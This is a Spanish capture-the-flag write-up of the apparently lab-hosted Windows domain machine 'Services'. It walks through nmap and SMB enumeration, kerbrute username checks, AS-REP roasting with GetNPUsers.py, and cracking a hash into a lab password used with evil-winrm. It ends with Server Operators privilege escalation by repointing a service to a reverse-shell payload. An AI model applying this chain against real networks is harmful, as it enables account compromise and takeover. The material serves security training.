# Introducción

Nos enfrentamos a la máquina Services

# Enumeración

Ping + SO

```
ping -c 3 10.10.134.65
PING 10.10.134.65 (10.10.134.65) 56(84) bytes of data.
64 bytes from 10.10.134.65: icmp_seq=1 ttl=128 time=2.99 ms
64 bytes from 10.10.134.65: icmp_seq=2 ttl=128 time=0.950 ms
64 bytes from 10.10.134.65: icmp_seq=3 ttl=128 time=0.721 ms

--- 10.10.134.65 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 0.721/1.554/2.991/1.020 ms
```

Como podemos ver nos encontramos contra una máquina Windows (ttl=128)

Escáner puertos

```
sudo nmap -sCV -T4 --min-rate 4000 -p- 10.10.134.65

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-30 09:05 BST
Nmap scan report for ip-10-10-134-65.eu-west-1.compute.internal (10.10.134.65)
Host is up (0.0011s latency).
Not shown: 65506 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-30 08:05:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2024-09-29T08:02:09
|_Not valid after:  2025-03-31T08:02:09
|_ssl-date: 2024-09-30T08:06:31+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp  open  pando-pub?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 02:BB:66:A2:D0:4B (Unknown)
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: WIN-SERVICES, NetBIOS user: <unknown>, NetBIOS MAC: 02:bb:66:a2:d0:4b (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-30 09:06:32
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Vaya vaya encontramos bastantes cosas vamos a ir poco a poco enumerando todo y viendo que podemos hacer, cosas imporantes para tener en cuenta, tenemos el 80 abierto con un http, un kerberos por el 88 etc.

La primera enumeración que haremos es por el servicio smb utilizaremos (smbclient)

```
smbclient -L //10.10.134.65/
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
smb1cli_req_writev_submit: called for dialect[SMB3_11] server[10.10.134.65]
Error returning browse list: NT_STATUS_REVISION_MISMATCH
Reconnecting with SMB1 for workgroup listing.
Connection to 10.10.134.65 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Failed to connect with SMB1 -- no workgroup available
```

Gracias a esto nos damos cuenta que hay un usuario Anonymous que nos deja loguearnos sin necesidad de contraseña. Pero no encontramos nada importante y nos echa, con lo cuál nos vamos a otra enumeración.

La web:

![image](https://github.com/user-attachments/assets/bc0c32de-af54-48f2-bba2-e78076febe33)

Si vamos explorando la web nos encontramos con todos los empleados que hay en la empresa.

![image](https://github.com/user-attachments/assets/ee78e873-5f18-474b-89a9-04c603f4e2f7)

Si nos fijamos más abajo encontramos un correo electrico referido a servicios "j.doe@sevices.local" doy por hecho que se refiere a "Joanne Doe"

Tenemos un nombre y correo j.doe@services.local:Joanne Doe

Una forma muy guay de comprobar que estos correos son reales es con kerbrute utilizando kerberos

Creamos unos correos y usuarios predefinidos nosotros.

1- j.Doe : Joanne Doe
2- j.Rock - Jack Rock
3- w.Masters - Will Masters
4- J-LaRusso - Johnny LaRusso

![image](https://github.com/user-attachments/assets/cb683c86-4e1a-47d3-bb4d-42e4f9e3e9a9)

Cogemos el repo de [Kerbrute](https://github.com/ropnop/kerbrute)

![image](https://github.com/user-attachments/assets/a017319d-bfd0-4348-b8e8-de97dc5a2456)

Como podemos ver encontramos que todos los correos son válidos, esto que nos llevamos!!

Vamos a hacer un [AS-Rep Roasting](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)

Este ataque recoge a los usuarios que tienen la pre-autenticación de Kerberos quitada y caputa el hash de la contraseña.

```
GetNPUsers.py -dc-ip <Target's IP address> -request 'services.local/' -usersfile <username file> -format hashcat
```

![image](https://github.com/user-attachments/assets/1ae9c0e7-3416-4a3d-9586-732b33e0e4f8)

Una vez recogido el hash, podemos utilizas "hashcat" o "john" para descifrar la pass

![image](https://github.com/user-attachments/assets/3a999345-0e3f-4bdb-8c73-78a4c7b84d61)

![image](https://github.com/user-attachments/assets/1b8c235f-10e3-481d-9872-92413b620bd9)

j.rock:Serviceworks1

```
evil-winrm -i 10.10.134.65 -u j.rock -p Serviceworks1
```

Estamos dentro, como siempre vamos a enumerar quien somos y que servicios y privilegios disponemos

![image](https://github.com/user-attachments/assets/7c80ee70-b8e4-4b52-81f8-15fcbb492859)

Nos encontramos que tenemos permisos del grupo "Sever Operators" en este grupo tenemor disponibilidad de parar y correr servicios, para listarlos

```
services
```

![image](https://github.com/user-attachments/assets/7e57f3b0-a31e-4310-9bd1-fea2302c31a9)

(A sí queremos ya podemos coger la flag del usuario

Podemos elegir el servicio que queramos y cambiar el payload como nostros queramos, elegire en mi caso el servicio "cfn-hup"

pero primero habra que crear el payload con este [repo](https://github.com/dev-frog/C-Reverse-Shell)

![image](https://github.com/user-attachments/assets/a67358b6-c1a7-4bc1-a5df-681f3cee2f29)

![image](https://github.com/user-attachments/assets/4f80561c-bee2-42e8-9642-7da878ca2d28)

![image](https://github.com/user-attachments/assets/9b94c992-5dd3-4f02-9aa2-7b2e7dbf2153)

Una vez tenemos el script ya podemos cambiar el path de dicho servicio al payload y hacer un nc

![image](https://github.com/user-attachments/assets/2514fc13-0455-4cbe-9795-0634e38e894f)

GG!!

Para entender un poco todo lo que hemos hecho:

- Hemos cogido los usuarios y correos validos de kerberos
- Hemos comprobado los que no tenían la autentificación por defecto y gracias a ello hemos sacado su hash de contraseña
- Hemos sacado uno y lo hemos desencriptado, dentro de la sesión hemos listado los servicios
- Hemos encontrado un servicio y un grupo que teniamos permisos, hemos cambiado dicho servicio de ruta refiriendose a nuestro payload
- Hemos creado una shell reversa con permisos de administrador



